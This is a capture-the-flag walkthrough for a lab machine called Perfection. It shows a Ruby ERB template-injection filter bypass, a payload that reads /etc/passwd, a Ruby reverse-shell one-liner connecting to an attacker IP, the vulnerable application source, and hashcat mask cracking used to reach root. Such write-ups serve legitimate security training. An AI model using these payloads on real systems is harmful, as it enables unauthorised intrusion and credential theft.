# Perfection

## Enumeration

```bash
nmap -v -A -p- -Pn -sV -sC perfection.htb -oN nmap
```

```bash
Nmap scan report for perfection.htb (10.10.11.253)
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
| http-methods: 
|_  Supported Methods: GET HEAD
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/24%OT=22%CT=1%CU=41569%PV=Y%DS=2%DC=T%G=Y%TM=6629
OS:291B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 37.812 days (since Sun Mar 17 16:16:43 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   56.90 ms 10.10.14.1
2   56.99 ms perfection.htb (10.10.11.253)

NSE: Script Post-scanning.
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Initiating NSE at 11:45
Completed NSE at 11:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.51 seconds
           Raw packets sent: 66534 (2.932MB) | Rcvd: 66073 (2.673MB)
```

### HTTP (80)

<figure><img src="../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

The website seem to be developed with [WEBrick 1.7.0](https://rubygems.org/gems/webrick/versions/1.7.0):&#x20;

{% hint style="info" %}
WEBrick is a simple HTTP server toolkit for Ruby. It's included in the Ruby standard library, so you don't need to install any additional gems to use it. WEBrick is used to create HTTP servers in Ruby applications. It's a basic, built-in server that you can use for development or small-scale deployments.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

Try to enter some good values, we obtain this output:

<figure><img src="../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

Exploiring some typical endpoints like `/robots.txt` we obtain this strange error as 404:

<figure><img src="../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

So we also know that is used [Sinatra](https://github.com/sinatra/sinatra).

{% hint style="info" %}
Sinatra is a lightweight web application framework for Ruby. It provides a DSL (Domain Specific Language) for defining web applications in Ruby with minimal effort. With Sinatra, you define routes, handle requests, and render responses using Ruby code. It's often used for building APIs, small web services, or prototyping applications.
{% endhint %}

Fuzzing with input box, there are possibilities that there is some code injection like SSTI. Trying the input `{{7*7}}` to test SSTI, return a strange output:

<figure><img src="../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

## Exploitation (foothold/user)

It would appear that attempting to use Ruby syntax directly within the input fields causes it to be detected and the request to be filtered accordingly. Also trying some payloads taken from the following [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---retrieve-etcpasswd) do not appear to work correctly.

Looking online for a way to bypass the filter, I came across the following [article ](https://blog.devops.dev/ssti-bypass-filter-0-9a-z-i-08a5b3b98def)that exploits the carriage return to inject malicious code inside the Ruby template. However, we need to do the encoding using BurpSuite's Decoder tool of the following payload:

```ruby
test
<%= File.open('/etc/passwd').read %>
```

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

After confirming SSTI let’s enumerate more. let’s try to run system command to obtain a reverse shell. As we now an ERB template looks like a plain-text document interspersed with tags containing Ruby code:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sQmmb6YGiT7A8TPoF_GZ5w.png" alt="" height="247" width="700"><figcaption></figcaption></figure>

As we can see template uses Ruby code, we can search how can we perform system command using Ruby. It looks like it’s very easy, so our input will be:

```ruby
<%= system(id) %>
```

of course it will be URL encoded but we have a problem...

<figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

We obtain only an `Internal Server Error`:

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

But fortunately there are other payloads to achieve an RCE by exploiting SSTI with Ruby as shown in the following [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution):

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Et voilà :tada:

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

After ensuring the presence of ruby and the location of the interpreter on the machine:

<figure><img src="../../.gitbook/assets/image (615).png" alt=""><figcaption></figcaption></figure>

The Ruby interpreter is at `/usr/bin/ruby`:

<figure><img src="../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>

On attacker machine:

```bash
pwncat-cs -lp 4444
```

On BurpSuite (URL encoded):

{% code overflow="wrap" %}
```ruby
test 
<%= `/usr/bin/ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.15.101",4444))'` %>
```
{% endcode %}

and finally obtain a reverse shell as `susan`:

<figure><img src="../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>

{% code title="main.rb" overflow="wrap" %}
```ruby
require 'sinatra'
require 'erb'
set :show_exceptions, false

configure do
    set :bind, '127.0.0.1'
    set :port, '3000'
end

get '/' do
    index_page = ERB.new(File.read 'views/index.erb')
    response_html = index_page.result(binding)
    return response_html
end

get '/about' do
    about_page = ERB.new(File.read 'views/about.erb')
    about_html = about_page.result(binding)
    return about_html
end

get '/weighted-grade' do
    calculator_page = ERB.new(File.read 'views/weighted_grade.erb')
    calcpage_html = calculator_page.result(binding)
    return calcpage_html
end

post '/weighted-grade-calc' do
    total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i
    if total_weight != 100
        @result = "Please reenter! Weights do not add up to 100."
        erb :'weighted_grade_results'
    elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category2] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category3] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category4] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category5] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:grade1] =~ /^(?:100|\d{1,2})$/ && params[:grade2] =~ /^(?:100|\d{1,2})$/ && params[:grade3] =~ /^(?:100|\d{1,2})$/ && params[:grade4] =~ /^(?:100|\d{1,2})$/ && params[:grade5] =~ /^(?:100|\d{1,2})$/ && params[:weight1] =~ /^(?:100|\d{1,2})$/ && params[:weight2] =~ /^(?:100|\d{1,2})$/ && params[:weight3] =~ /^(?:100|\d{1,2})$/ && params[:weight4] =~ /^(?:100|\d{1,2})$/ && params[:weight5] =~ /^(?:100|\d{1,2})$/
        @result = ERB.new("Your total grade is <%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %>\%<p>" + params[:category1] + ": <%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %>\%</p><p>" + params[:category2] + ": <%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %>\%</p><p>" + params[:category3] + ": <%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %>\%</p><p>" + params[:category4] + ": <%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %>\%</p><p>" + params[:category5] + ": <%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %>\%</p>").result(binding)
        erb :'weighted_grade_results'
    else
        @result = "Malicious input blocked"
        erb :'weighted_grade_results'
    end
end
```
{% endcode %}

And also obtain the user flag:

<figure><img src="../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (root)

Under a directory called `Migration` there is a strange .db file:

<figure><img src="../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>

Also if we type `ls -la`  under `/home/susan` directory we see a SQLite related file:

<figure><img src="../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

this suggests the presence of SQLite and in fact trying to open the .db with sqlite from the command line we can see the different tables (only once!) in the database.

<figure><img src="../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>

Saving one hash in a file called hash.txt and performing hash identification using Hashcat we obtain this result:

<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption><p>ù</p></figcaption></figure>

Trying to crack passwords seems to have gone down a rabbit hole, probably because none of the users in the database are mapped to the /etc/passwd user list:

<figure><img src="../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>

After executing LinPeas and reading carefully the output we can see that section:

<figure><img src="../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

It list readable files belonging to `root` and readable by `susan` but not world readable! Interesting :yum:

If we read this file we obtain a big clue about privilege escalation:

<figure><img src="../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>

The funny thing is that the message refers to [something that actually happened](https://nypost.com/2022/03/26/nyc-students-have-personal-data-hacked/) namely the data breach of the PupilPath application.

With this clue we can try to bruteforce susan's password and try to use sudo to see what commands she can run as root. We use Hashcat [masks](https://hashcat.net/wiki/doku.php?id=mask_attack) to crack the hash of Susan:

```bash
hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Knowing the password we run the command to see what we can run as root and find that we only need to give a `sudo su` to become root and complete the machine!

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
